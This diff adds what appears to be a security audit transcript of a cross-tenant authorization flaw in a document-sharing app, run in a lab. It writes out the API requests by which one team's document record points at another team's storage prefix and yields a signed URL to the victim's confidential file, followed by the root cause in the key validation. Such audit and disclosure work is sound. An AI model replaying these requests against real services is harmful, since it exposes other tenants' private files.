@@ -1,0 +1,31 @@
+H3 TRANSCRIPT 2026-09-27T06:24:08Z
+Attacker : mallory@attacker.test, team cmuiv8b4d0003mqejm7mle4sl (free plan)
+Victim   : team cmuiv8b3q0001mqejmb79rz8g
+Target   : cmuiv8b3q0001mqejmb79rz8g/doc_seed/board-deck.pdf
+
+--- STEP 1: create a document in the ATTACKER's team whose file key points at the VICTIM's prefix ---
+POST /api/teams/cmuiv8b4d0003mqejm7mle4sl/documents  {"url":"cmuiv8b3q0001mqejmb79rz8g/doc_seed/board-deck.pdf", ...}
+  HTTP 500 (Trigger.dev is unconfigured in the lab) - but the row is written first:
+documentId=cmujfm5j20007mqvevc2sqmzt | ownerTeam=cmuiv8b4d0003mqejm7mle4sl | file=cmuiv8b3q0001mqejmb79rz8g/doc_seed/board-deck.pdf
+
+  The owning team and the storage prefix belong to DIFFERENT tenants.
+
+--- STEP 2: attacker downloads her own document ---
+POST /api/teams/cmuiv8b4d0003mqejm7mle4sl/documents/cmujfm5j20007mqvevc2sqmzt/download
+  HTTP 200
+  signed URL path: http://pm-audit-minio:4566/papermark-audit/cmuiv8b3q0001mqejmb79rz8g/doc_seed/board-deck.pdf
+
+--- STEP 3: fetch it ---
+VICTIM ORIGINAL BOARD DECK - HIGHLY CONFIDENTIAL
+
+  [HTTP 200]
+
+RESULT: the victim team's original file, read by an unrelated tenant.
+
+ROOT CAUSE:
+  lib/zod/url-validation.ts:112-114 - s3PathPattern is
+    /^[a-zA-Z0-9_-]+\/doc_[a-zA-Z0-9_-]+\/[a-zA-Z0-9_.-]+\.[a-zA-Z0-9]+$/
+  The first segment is ANY id. It is never compared to the caller's teamId.
+  lib/api/documents/process-document.ts:106,125 then stores 'file: key' verbatim.
+  pages/api/file/s3/get-presigned-get-url.ts:55-56 derives the team FROM the key,
+  so it signs with the victim team's own storage configuration.
